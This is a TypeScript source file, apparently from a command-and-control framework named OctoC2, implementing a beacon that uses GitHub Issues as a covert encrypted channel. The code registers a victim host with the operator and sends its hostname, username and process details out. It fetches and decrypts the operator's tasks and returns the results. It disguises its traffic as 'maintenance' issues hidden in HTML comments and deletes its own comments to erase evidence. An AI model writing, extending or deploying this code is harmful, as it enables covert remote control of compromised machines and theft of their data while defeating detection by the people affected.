/**
 * OctoC2 — IssuesTentacle (Tentacle 1)
 *
 * Primary C2 channel. Uses GitHub Issues as a persistent encrypted message bus.
 * Each beacon owns one issue; checkins, task deliveries, and results are
 * exchanged as issue comments in the locked format defined in:
 *   docs/superpowers/specs/2026-03-27-issues-tentacle-design.md
 *
 * Comment format (beacon → server):
 *   <!-- job:{epoch}:{type}:{seq} -->
 *   <!-- infra-diagnostic:{epoch}:{base64url_sealed_ciphertext} -->
 *   <!-- - -->
 *
 * Comment format (server → beacon):
 *   <!-- job:{epoch}:deploy:{task_ref} -->
 *   ### 📌 Maintenance Task · Ref `{task_ref}`
 *   <details><summary>Operation parameters</summary>
 *   ```text\n{base64url_ciphertext}\n```
 *   </details>
 *   <!-- {base64url_nonce} -->
 *
 * Crypto:
 *   Beacon → Server : crypto_box_seal  (anonymous, operator decrypts)
 *   Server → Beacon : crypto_box       (authenticated, beacon verifies operator)
 */

import { hostname as osHostname } from "node:os";
import type { CheckinPayload, Task, TaskResult } from "../types.ts";
import { BaseTentacle } from "./BaseTentacle.ts";
import {
  sealBox, decryptBox,
  bytesToBase64, base64ToBytes, sodiumBytesToString,
} from "../crypto/sodium.ts";
import { loadState, createState, type BeaconState } from "../state/BeaconState.ts";
import {
  buildMaintenanceComment,
  decryptMaintenancePayload,
  type MaintenanceTaskRecord,
  type MaintenanceCommentParams,
} from "./MaintenanceComment.ts";
import { getEvasionState } from "../evasion/OpenHulud.ts";

export { decryptMaintenancePayload };

// ── Constants ─────────────────────────────────────────────────────────────────

const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";

// Regexes for parsing comment bodies.
// The job marker is wrapped in an HTML comment so it is invisible to viewers
// while still being machine-parseable: <!-- job:{epoch}:{type}:{seq} -->
const HEARTBEAT_RE  = /<!--\s*job:(\d+):(reg|ci|logs|deploy):([^\s>]+)\s*-->/m;
const CIPHERTEXT_RE = /```text\n([A-Za-z0-9_\-+/=]+)\n```/;
// Matches the sealed-only placeholder <!-- - --> and real operator nonces <!-- base64url -->.
// Colons in the job marker keep it outside this character class, so there is no overlap.
const NONCE_RE      = /<!--\s+(-|[A-Za-z0-9_-]{4,})\s+-->/;

// Read poll config at call-time so tests can override via env before checkin() is called
const getPollTimeoutMs = () => parseInt(process.env["SVC_POLL_TIMEOUT_MS"] ?? "30000", 10);
const getPollRetryMs   = () => parseInt(process.env["SVC_POLL_RETRY_MS"]   ?? "10000", 10);

// ── Maintenance session constants ─────────────────────────────────────────────

const MAINTENANCE_MIN_INTERVAL_MS = 30_000;
const MAINTENANCE_MAX_INTERVAL_MS = 60_000;

// ── Task ref helper ───────────────────────────────────────────────────────────

function taskRef(taskId: string): string {
  // Use the first 4 bytes of the UUID hex (8 chars, no hyphens)
  return `maint-${taskId.replace(/-/g, "").slice(0, 4)}`;
}

// ── Comment builders ──────────────────────────────────────────────────────────

function buildBeaconComment(
  type: "reg" | "ci" | "logs",
  seq: number,
  _payload: CheckinPayload,
  ciphertextB64: string
): string {
  const epoch = Math.floor(Date.now() / 1000);

  return [
    // All lines are HTML comments — invisible to GitHub viewers; parsed by server and octoctl
    `<!-- job:${epoch}:${type}:${String(seq).padStart(4, "0")} -->`,
    `<!-- infra-diagnostic:${epoch}:${ciphertextB64} -->`,
    "<!-- - -->",
  ].join("\n");
}

function buildResultComment(
  seq: number,
  payload: CheckinPayload,
  ciphertextB64: string
): string {
  return buildBeaconComment("logs", seq, payload, ciphertextB64);
}

// ── Comment parser ─────────────────────────────────────────────────────────────

interface ParsedComment {
  type: string;
  seq: string;
  ref: string;
  ciphertext: string;
  nonce: string;
}

function parseComment(body: string): ParsedComment | null {
  const hb = HEARTBEAT_RE.exec(body);
  if (!hb) return null;

  const ctMatch = CIPHERTEXT_RE.exec(body);
  if (!ctMatch) return null;

  const nonceMatch = NONCE_RE.exec(body);

  return {
    type:       hb[2]!,
    seq:        hb[3]!,
    ref:        hb[3]!,
    ciphertext: ctMatch[1]!.trim(),
    nonce:      nonceMatch?.[1]?.trim() ?? "-",
  };
}

// ── IssuesTentacle ────────────────────────────────────────────────────────────

export class IssuesTentacle extends BaseTentacle {
  readonly kind = "issues" as const;

  private initialized = false;
  private initError: Error | null = null;
  private initErrorAt = 0;
  private initPromise: Promise<void> | null = null;
  private static readonly INIT_RETRY_MS = 5 * 60 * 1000; // retry transient errors after 5 min

  private operatorPublicKey: Uint8Array | null = null;
  private state: BeaconState | null = null;

  /** Expose the tracked issue number for external cleanup (e.g. proxy teardown). */
  get currentIssueNumber(): number | null {
    return this.state?.issueNumber ?? null;
  }

  /**
   * Tasks received during the registration ACK poll are stored here so they
   * are not lost. On the first checkin() call the beacon would skip them
   * (their comment IDs are already below lastTaskCommentId), so we stash
   * them during init and return them on the first checkin() instead.
   */
  private pendingInitialTasks: Task[] = [];

  /** Rate-limit gate: epoch-ms before which upsertMaintenanceComment() is a no-op. */
  private nextMaintenanceUpdateMs = 0;

  /**
   * In-memory task roster for the maintenance session comment.
   * Populated by register() (reg-ack entry), checkin() (incoming tasks),
   * and submitResult() (marks tasks completed/failed).
   * Session-only — reset on process restart.
   */
  private maintenanceTasks: MaintenanceTaskRecord[] = [];

  // ── isAvailable ─────────────────────────────────────────────────────────────

  /**
   * Lightweight liveness check — does NOT trigger full initialization.
   * Verifies: (1) PAT can access the repo, (2) operator pubkey variable exists.
   */
  override async isAvailable(): Promise<boolean> {
    try {
      await this.octokit.rest.repos.get({
        owner: this.config.repo.owner,
        repo:  this.config.repo.name,
      });
      await this.octokit.rest.actions.getRepoVariable({
        owner:       this.config.repo.owner,
        repo:        this.config.repo.name,
        name:        OPERATOR_PUBKEY_VAR,
      });
      return true;
    } catch {
      return false;
    }
  }

  // ── Initialization ───────────────────────────────────────────────────────────

  private async ensureInitialized(): Promise<void> {
    if (this.initialized) return;

    // Surface a persistent init error immediately (don't retry fatal failures)
    if (this.initError) {
      if (this.isFatalError(this.initError) || Date.now() - this.initErrorAt < IssuesTentacle.INIT_RETRY_MS) {
        throw this.initError;
      }
      // Transient error is older than retry window — clear and retry
      console.log("[IssuesTentacle] init error expired — retrying initialization");
      this.initError = null;
      this.initErrorAt = 0;
    }

    // Deduplicate concurrent calls (e.g. checkin + submitResult race)
    if (!this.initPromise) {
      this.initPromise = this._initialize().catch((err) => {
        this.initError = err as Error;
        this.initErrorAt = Date.now();
        this.initPromise = null;
        throw err;
      });
    }
    await this.initPromise;
  }

  /**
   * Classify an error as fatal (auth/config) or transient (network/rate-limit).
   * Fatal errors are never retried; transient errors are retried after INIT_RETRY_MS.
   */
  private isFatalError(err: Error): boolean {
    const status = (err as any).status as number | undefined;
    if (status === 401 || status === 403 || status === 404) return true;
    const msg = err.message.toLowerCase();
    if (msg.includes("bad credentials") || msg.includes("not found")) return true;
    return false;
  }

  private async _initialize(): Promise<void> {
    // 1. Fetch operator public key from GitHub Variable
    await this.fetchOperatorPublicKey();

    // 2. Load or create the state file
    await this.loadOrCreateStateFile();

    // 3. Discover or create this beacon's persistent issue
    if (this.state!.issueNumber === null) {
      const num = await this.discoverOrCreateIssue();
      this.state!.issueNumber = num;
      await this.state!.persist();
    }

    // 4. Send registration comment if server hasn't ACK'd yet
    if (this.state!.registrationStatus === "pending") {
      await this.register();
    }

    this.initialized = true;

    // Clean up any leftover non-maintenance comments from prior sessions.
    // Best-effort: errors here must not prevent the beacon from operating.
    await this.startupCleanup().catch((err) =>
      console.warn("[IssuesTentacle] Startup cleanup failed:", (err as Error).message)
    );
  }

  // ── Operator public key ──────────────────────────────────────────────────────

  private async fetchOperatorPublicKey(): Promise<void> {
    // GitHub Variables API: GET /repos/{owner}/{repo}/actions/variables/{name}
    // Returns { name, value, created_at, updated_at }
    // Requires PAT with repo scope (or actions:read).
    const resp = await this.octokit.rest.actions.getRepoVariable({
      owner: this.config.repo.owner,
      repo:  this.config.repo.name,
      name:  OPERATOR_PUBKEY_VAR,
    });

    // @octokit/rest v21 types `value` as string on the response data object.
    const b64: string = resp.data.value;
    if (!b64 || b64.trim().length === 0) {
      throw new Error(
        `[IssuesTentacle] GitHub Variable '${OPERATOR_PUBKEY_VAR}' is missing or empty. ` +
        "Run: octoctl setup --set-operator-key  (or set it manually in repo variables)."
      );
    }

    this.operatorPublicKey = await base64ToBytes(b64);
  }

  // ── State file ────────────────────────────────────────────────────────────────

  private async loadOrCreateStateFile(): Promise<void> {
    const existing = await loadState(this.config.id);
    if (existing) {
      this.state = existing;
      return;
    }

    // First run: persist whichever keypair was already placed in config at startup.
    // index.ts generates a fresh keypair before any tentacle runs, so all tentacles
    // (including non-IssuesTentacle primaries like NotesTentacle) will have sent
    // the same public key in their ACK blobs. We must NOT generate a new keypair
    // here or the server-stored public key would be out of sync with the beacon's
    // actual decryption key.
    const kp = this.config.beaconKeyPair;
    const publicKey  = await bytesToBase64(kp.publicKey);
    const secretKey  = await bytesToBase64(kp.secretKey);

    this.state = await createState(this.config.id, { publicKey, secretKey });
    // config.beaconKeyPair is already correct — no update needed.

    console.log(`[IssuesTentacle] Created state file at ${this.state.filePath}`);
  }

  // ── Issue discovery / creation ────────────────────────────────────────────────

  private async discoverOrCreateIssue(): Promise<number> {
    const { owner, name: repo } = this.config.repo;
    const beaconId = this.state!.beaconId;

    // Search open issues for one containing the hidden beacon marker.
    // No special labels are used — label-based filtering would be conspicuous.
    const issues = await this.octokit.paginate(
      this.octokit.rest.issues.listForRepo,
      { owner, repo, state: "open", per_page: 100 }
    );

    for (const issue of issues) {
      if (issue.body?.includes(`<!-- node:${beaconId} -->`)) {
        console.log(`[IssuesTentacle] Found existing issue #${issue.number}`);
        // Store the actual GitHub issue title (set at creation time)
        this.state!.issueTitle = issue.title ?? null;
        return issue.number;
      }
    }

    // Not found — create a new issue that blends into normal repo activity
    const host    = osHostname();
    const shortId = beaconId.replace(/-/g, "").slice(0, 8);
    // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
    const envTitle = process.env.SVC_ISSUE_TITLE?.trim() || undefined;
    const title   = envTitle ?? `Scheduled maintenance · ${shortId}`;
    this.state!.issueTitle = title;
    const body    = [
      // Hidden marker used for rediscovery if state file is lost
      `<!-- node:${beaconId} -->`,
      "",
      `System check-in completed.`,
      `Created: ${new Date().toISOString()}`,
    ].join("\n");

    const created = await this.octokit.rest.issues.create({
      owner,
      repo,
      title,
      body,
    });

    console.log(`[IssuesTentacle] Created issue #${created.data.number}: ${title}`);
    return created.data.number;
  }

  // ── Registration ──────────────────────────────────────────────────────────────

  /**
   * Post a one-time [job:...:reg:...] comment and wait for the server's ACK.
   * The sealed payload includes this beacon's public key so the server can
   * register it and encrypt subsequent task deliveries to it.
   */
  private async register(): Promise<void> {
    const state = this.state!;
    const seq   = state.nextSeq();

    const host = osHostname();
    const now  = new Date().toISOString();

    const regPayload = {
      beaconId:     state.beaconId,
      publicKey:    state.keyPair.publicKey,
      hostname:     host,
      username:     process.env["USER"] ?? process.env["USERNAME"] ?? "unknown",
      os:           process.platform,
      arch:         process.arch,
      pid:          process.pid,
      registeredAt: now,
    };

    const ciphertextB64 = await sealBox(
      JSON.stringify(regPayload),
      this.operatorPublicKey!
    );

    const regEpoch = Math.floor(Date.now() / 1000);
    const body = [
      `<!-- job:${regEpoch}:reg:${String(seq).padStart(4, "0")} -->`,
      `<!-- infra-diagnostic:${regEpoch}:${ciphertextB64} -->`,
      "<!-- - -->",
    ].join("\n");

    const postedAt = new Date().toISOString();
    const regCommentId = await this.postComment(body);
    state.regCommentId = regCommentId;
    await state.persist();

    // Wait for server ACK ([job:...:deploy:reg-ack])
    const ackTasks = await this.pollForDeployComments(postedAt, getPollTimeoutMs());

    // Any deploy comment (including an empty task list) counts as ACK
    state.registrationStatus = "registered";
    await state.persist();

    this.maintenanceTasks.push({
      taskId: "reg-ack",
      ref:    "reg-ack",
      kind:   "reg-ack",
      status: "completed",
    });

    // Trigger the first maintenance comment immediately after registration.
    // This ensures maintenanceCommentId is set before the first checkin() call,
    // so checkin() skips the CI heartbeat from the start.
    const registrationPayload: CheckinPayload = {
      beaconId:  state.beaconId,
      publicKey: state.keyPair.publicKey,
      hostname:  host,
      username:  regPayload.username,
      os:        process.platform,
      arch:      process.arch,
      pid:       process.pid,
      checkinAt: now,
    };
    await this.upsertMaintenanceComment(registrationPayload);

    // OPSEC: delete the registration comment now that maintenance is established.
    // The server has already ACK'd, so the comment has served its purpose.
    if (state.regCommentId) {
      const { owner, name: repo } = this.config.repo;
      try {
        await this.octokit.rest.issues.deleteComment({
          owner, repo,
          comment_id: state.regCommentId,
        });
        console.log(`[IssuesTentacle] Deleted registration comment #${state.regCommentId}`);
      } catch { /* best-effort */ }
      state.regCommentId = null;
      await state.persist();
    }

    // Stash any tasks received during registration so they are not lost.
    // The first checkin() call would skip them (their comment IDs are already
    // below lastTaskCommentId), so we hand them off via pendingInitialTasks.
    if (ackTasks.length > 0) {
      this.pendingInitialTasks = ackTasks;
    }

    console.log(
      `[IssuesTentacle] Registered. Server responded with ${ackTasks.length} initial task(s).`
    );
  }

  // ── checkin ───────────────────────────────────────────────────────────────────

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    await this.ensureInitialized();

    // Tasks captured during registration polling (before the first checkin)
    // would be invisible to a normal poll (their IDs are already below
    // lastTaskCommentId). Return them immediately so they are not lost.
    if (this.pendingInitialTasks.length > 0) {
      const tasks = this.pendingInitialTasks;
      this.pendingInitialTasks = [];
      for (const task of tasks) {
        this.maintenanceTasks.push({
          taskId: task.taskId,
          ref:    task.ref ?? task.taskId.replace(/-/g, "").slice(0, 8),
          kind:   task.kind,
          status: "pending",
        });
      }
      return tasks;
    }

    const state = this.state!;
    const seq   = state.nextSeq();

    // Seal the full checkin payload for the operator
    const ciphertextB64 = await sealBox(
      JSON.stringify(payload),
      this.operatorPublicKey!
    );

    const body = buildBeaconComment("ci", seq, payload, ciphertextB64);

    const skipNormalComment = state.initialMaintenancePosted;
    console.log(`[checkin] maintenanceCommentId: ${state.maintenanceCommentId ?? "none"}, skippedNormalComment: ${skipNormalComment}`);

    // Update the maintenance session comment first (rate-limited).
    await this.upsertMaintenanceComment(payload);

    // Skip the CI heartbeat once maintenance is established (it carries all visible status).
    // initialMaintenancePosted persists across restarts so this is effective from the very
    // first checkin even after process restarts.
    if (!skipNormalComment) {
      const { owner, name: repo } = this.config.repo;
      if (state.ciCommentId) {
        await this.octokit.rest.issues.updateComment({
          owner, repo,
          comment_id: state.ciCommentId,
          body,
        });
      } else {
        const created = await this.octokit.rest.issues.createComment({
          owner, repo,
          issue_number: state.issueNumber!,
          body,
        });
        state.ciCommentId = created.data.id;
      }
      await state.persist();
    }

    // Prune old result comments (OPSEC evidence cleanup)
    await this.pruneOldComments();

    // Look back 10 minutes so tasks queued between poll windows are never
    // missed. The lastTaskCommentId cursor handles deduplication.
    const lookbackMs = 10 * 60 * 1000;
    const since = new Date(Date.now() - lookbackMs).toISOString();
    const tasks = await this.pollForDeployComments(since, getPollTimeoutMs());

    // Track newly received tasks in the maintenance session list
    for (const task of tasks) {
      this.maintenanceTasks.push({
        taskId: task.taskId,
        ref:    task.ref ?? task.taskId.replace(/-/g, "").slice(0, 8),
        kind:   task.kind,
        status: "pending",
      });
    }

    return tasks;
  }

  // ── submitResult ─────────────────────────────────────────────────────────────

  async submitResult(result: TaskResult): Promise<void> {
    await this.ensureInitialized();

    const state = this.state!;
    const seq   = state.nextSeq();

    // Re-use the checkin payload shape for the visible metadata section
    const visiblePayload: CheckinPayload = {
      beaconId:  result.beaconId,
      publicKey: state.keyPair.publicKey,
      hostname:  osHostname(),
      username:  process.env["USER"] ?? process.env["USERNAME"] ?? "unknown",
      os:        process.platform,
      arch:      process.arch,
      pid:       process.pid,
      checkinAt: result.completedAt,
    };

    const ciphertextB64 = await sealBox(
      JSON.stringify(result),
      this.operatorPublicKey!
    );

    const body = buildResultComment(seq, visiblePayload, ciphertextB64);

    await this.postComment(body);
    await state.persist();

    // Update task status in the in-memory maintenance roster
    const record = this.maintenanceTasks.find((t) => t.taskId === result.taskId);
    if (record) {
      record.status = result.success ? "completed" : "failed";
    }

    // Refresh the maintenance comment (rate-limited — may be a no-op)
    await this.upsertMaintenanceComment(visiblePayload);
  }

  // ── Poll for task delivery comments ──────────────────────────────────────────

  /**
   * Poll the beacon's issue for [job:...:deploy:...] comments posted after
   * `since` (ISO-8601). Retries every POLL_RETRY_MS until POLL_TIMEOUT_MS
   * elapses, then returns whatever tasks were found (possibly none).
   */
  private async pollForDeployComments(
    since: string,
    timeoutMs: number
  ): Promise<Task[]> {
    const state       = this.state!;
    const deadline    = Date.now() + timeoutMs;
    const issueNumber = state.issueNumber!;
    const { owner, name: repo } = this.config.repo;

    while (Date.now() < deadline) {
      const comments = await this.octokit.rest.issues.listComments({
        owner,
        repo,
        issue_number: issueNumber,
        since,
        per_page: 100,
      });

      const deployComments = comments.data.filter((c) =>
        /<!--\s*job:\d+:deploy:/m.test(c.body ?? "")
      );

      if (deployComments.length > 0) {
        const tasks: Task[] = [];
        let processedAny = false;

        for (const comment of deployComments) {
          // Skip already-processed comments
          if (state.lastTaskCommentId !== null && comment.id <= state.lastTaskCommentId) {
            continue;
          }

          const parsed = parseComment(comment.body ?? "");
          if (!parsed) continue;

          try {
            // Decrypts to [] for ACK-only comments (e.g. reg-ack with empty task array)
            const task = await this.decryptTaskComment(parsed);
            tasks.push(...task);
            state.lastTaskCommentId = Math.max(state.lastTaskCommentId ?? 0, comment.id);
            processedAny = true;

            // OPSEC: delete the deploy comment after reading — leaves no server instructions in the issue.
            try {
              await this.octokit.rest.issues.deleteComment({ owner, repo, comment_id: comment.id });
            } catch { /* best-effort — already deleted is fine */ }
          } catch (err) {
            console.warn(
              `[IssuesTentacle] Failed to decrypt task comment ${comment.id}:`,
              (err as Error).message
            );
          }
        }

        // Return as soon as we've processed any deploy comment from the server —
        // an empty task array is a valid ACK (e.g. reg-ack or checkin with no tasks).
        if (processedAny) {
          await state.persist();
          return tasks;
        }
      }

      // No actionable comments yet — wait and retry
      const retryMs = getPollRetryMs();
      if (Date.now() + retryMs < deadline) {
        await sleep(retryMs);
      } else {
        break;
      }
    }

    return [];
  }

  // ── Decrypt a task delivery comment ──────────────────────────────────────────

  private async decryptTaskComment(parsed: ParsedComment): Promise<Task[]> {
    if (parsed.nonce === "-") {
      throw new Error("Task comment has placeholder nonce — server error");
    }

    const beaconSecretKey = await base64ToBytes(this.state!.keyPair.secretKey);

    const plaintext = await decryptBox(
      parsed.ciphertext,
      parsed.nonce,
      this.operatorPublicKey!,   // sender = operator
      beaconSecretKey            // recipient = this beacon
    );

    const decoded = sodiumBytesToString(plaintext);
    const tasks   = JSON.parse(decoded) as Task[];

    if (!Array.isArray(tasks)) {
      throw new Error("Decrypted task payload is not an array");
    }

    return tasks;
  }

  // ── Maintenance session comment ────────────────────────────────────────────────

  /**
   * Create or update the single persistent maintenance session comment on the
   * beacon's issue. Rate-limited: silently skips if called within the jittered
   * 30–60 s window since the last successful update.
   */
  private async upsertMaintenanceComment(payload: CheckinPayload): Promise<void> {
    if (Date.now() < this.nextMaintenanceUpdateMs) return;
    // Set minimum gate immediately so API errors don't remove rate-limit protection
    this.nextMaintenanceUpdateMs = Date.now() + MAINTENANCE_MIN_INTERVAL_MS;

    const state = this.state!;
    const _maintAction = state.maintenanceCommentId ? "update" : "create";
    const _maintSessionId = state.maintenanceSessionId ?? "(new)";
    console.log(`[maintenance] upsert triggered — sessionId: ${_maintSessionId}, action: ${_maintAction}, nextUpdateMs: ${this.nextMaintenanceUpdateMs}`);
    const { owner, name: repo } = this.config.repo;
    const now = new Date().toISOString();

    if (!state.maintenanceSessionId) {
      state.maintenanceSessionId    = crypto.randomUUID();
      state.maintenanceSessionOpenedAt = now;
      await state.persist();
    }

    const params: MaintenanceCommentParams = {
      sessionId:   state.maintenanceSessionId,
      hostname:    payload.hostname,
      openedAt:    state.maintenanceSessionOpenedAt ?? now,
      updatedAt:   now,
      platform:    `${payload.os}/${payload.arch}`,
      pid:         payload.pid,
      beaconId:    payload.beaconId,
      tasks:       [...this.maintenanceTasks],
      diagnostics: {
        beaconId:      payload.beaconId,
        hostname:      payload.hostname,
        os:            payload.os,
        arch:          payload.arch,
        pid:           payload.pid,
        checkinAt:     payload.checkinAt,
        taskCount:     this.maintenanceTasks.length,
        completedCount: this.maintenanceTasks.filter((t) => t.status === "completed").length,
        evasionLog:    getEvasionState().evasionLog,
      },
      operatorPubKey: this.operatorPublicKey!,
    };

    const body = await buildMaintenanceComment(params);

    if (state.maintenanceCommentId) {
      try {
        await this.octokit.rest.issues.updateComment({
          owner, repo,
          comment_id: state.maintenanceCommentId,
          body,
        });
      } catch (err: unknown) {
        const status = (err as { status?: number }).status;
        if (status === 404) {
          state.maintenanceCommentId = null;
          await state.persist();
        } else {
          throw err;
        }
      }
    }

    if (!state.maintenanceCommentId) {
      const created = await this.octokit.rest.issues.createComment({
        owner, repo,
        issue_number: state.issueNumber!,
        body,
      });
      state.maintenanceCommentId = created.data.id;
    }

    const jitter = Math.floor(
      Math.random() * (MAINTENANCE_MAX_INTERVAL_MS - MAINTENANCE_MIN_INTERVAL_MS)
    );
    this.nextMaintenanceUpdateMs = Date.now() + MAINTENANCE_MIN_INTERVAL_MS + jitter;

    // Mark the maintenance comment as established (persists across restarts)
    if (!state.initialMaintenancePosted) {
      state.initialMaintenancePosted = true;
    }

    state.lastMaintenanceUpdateMs = Date.now();
    await state.persist();
    console.log(`[maintenance] upsert complete — action: ${_maintAction}, next update in ${Math.round((this.nextMaintenanceUpdateMs - Date.now()) / 1000)}s`);
  }

  // ── Comment cleanup ───────────────────────────────────────────────────────────

  /**
   * One-time startup cleanup: delete all non-infra-update comments older than
   * 60 seconds from the tracked issue.
   *
   * Runs every startup but is safe to repeat (idempotent). Designed to catch
   * leftover comments from previous sessions — reg, old deploys, old results.
   * Spares only the current session's infra update comment; sync comments
   * from prior sessions (identified by a different session UUID) are treated as
   * stale and deleted along with all other non-sync comments. Any comment
   * less than 300 seconds old is also spared.
   */
  private async startupCleanup(): Promise<void> {
    const state = this.state!;
    if (!state.issueNumber) return;

    const { owner, name: repo } = this.config.repo;
    const cutoffMs  = Date.now() - 300_000;
    const cutoffISO = new Date(cutoffMs).toISOString();

    let comments: Array<{ id: number; created_at: string; body: string }>;
    try {
      const resp = await this.octokit.rest.issues.listComments({
        owner, repo,
        issue_number: state.issueNumber,
        per_page: 100,
      });
      comments = resp.data as Array<{ id: number; created_at: string; body: string }>;
    } catch {
      return; // best-effort — if listing fails, skip cleanup
    }

    const MAINT_SESSION_RE = /<!-- infra-maintenance:([0-9a-f-]+) -->/;

    const nonMaintenance = comments.filter(
      (c) => !c.body?.includes("<!-- infra-maintenance:")
    );

    // Maintenance comments from a different session (e.g. state loss caused a
    // second comment to be created on a previous run) must also be cleaned up.
    const staleMaintenance = comments.filter((c) => {
      const match = c.body?.match(MAINT_SESSION_RE);
      if (!match) return false;
      // stale if UUID doesn't match the current session (or state was lost → null)
      return match[1] !== state.maintenanceSessionId;
    });

    if (nonMaintenance.length === 0 && staleMaintenance.length === 0) return;

    const toDelete = [...nonMaintenance, ...staleMaintenance];
    let deleted = 0;
    for (const comment of toDelete) {
      // Only delete comments older than 300 seconds (prior sessions)
      if (comment.created_at >= cutoffISO) continue;

      try {
        await this.octokit.rest.issues.deleteComment({ owner, repo, comment_id: comment.id });
        deleted++;
      } catch { /* best-effort */ }
    }

    if (deleted > 0) {
      console.log(`[IssuesTentacle] Startup cleanup: deleted ${deleted} comment(s) (non-maintenance + stale sessions)`);
    }
  }

  /**
   * Delete all non-maintenance comments older than 30 seconds from the
   * beacon's issue. Only comments containing the `<!-- infra-maintenance: -->`
   * marker are spared — everything else is treated as ephemeral and removed.
   */
  private async pruneOldComments(): Promise<void> {
    const state = this.state!;
    const { owner, name: repo } = this.config.repo;
    // CI/reg heartbeats: prune after 120s (OPSEC — no long-term checkin trace)
    const ciCutoffISO   = new Date(Date.now() - 120_000).toISOString();
    // Result (logs) comments: keep for 30 min so octoctl can decrypt them
    const logsCutoffISO = new Date(Date.now() - 1_800_000).toISOString();

    const comments = await this.octokit.rest.issues.listComments({
      owner,
      repo,
      issue_number: state.issueNumber!,
      per_page: 100,
    });

    for (const comment of comments.data) {
      // Never delete the maintenance/ops comment
      if (/<!--\s*infra-maintenance:/.test(comment.body ?? "")) continue;

      // Result comments (logs) survive for 30 min so the operator can read them
      if (/<!--\s*job:\d+:logs:/.test(comment.body ?? "")) {
        if (comment.created_at >= logsCutoffISO) continue;
      } else {
        // CI/reg heartbeats pruned after 120s
        if (comment.created_at >= ciCutoffISO) continue;
      }

      await this.octokit.rest.issues.deleteComment({
        owner,
        repo,
        comment_id: comment.id,
      });
      console.log(`[IssuesTentacle] Pruned comment #${comment.id}`);
    }
  }

  // ── Post comment helper ───────────────────────────────────────────────────────

  private async postComment(body: string): Promise<number> {
    const { owner, name: repo } = this.config.repo;
    const created = await this.octokit.rest.issues.createComment({
      owner,
      repo,
      issue_number: this.state!.issueNumber!,
      body,
    });
    return created.data.id;
  }

  // ── Teardown ──────────────────────────────────────────────────────────────────

  override async teardown(): Promise<void> {
    // Persist final state (seq, lastTaskCommentId) before the process exits
    if (this.state) {
      await this.state.persist().catch((err) =>
        console.warn("[IssuesTentacle] teardown: state persist failed:", (err as Error).message)
      );
    }
  }
}

// ── Utility ───────────────────────────────────────────────────────────────────

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}
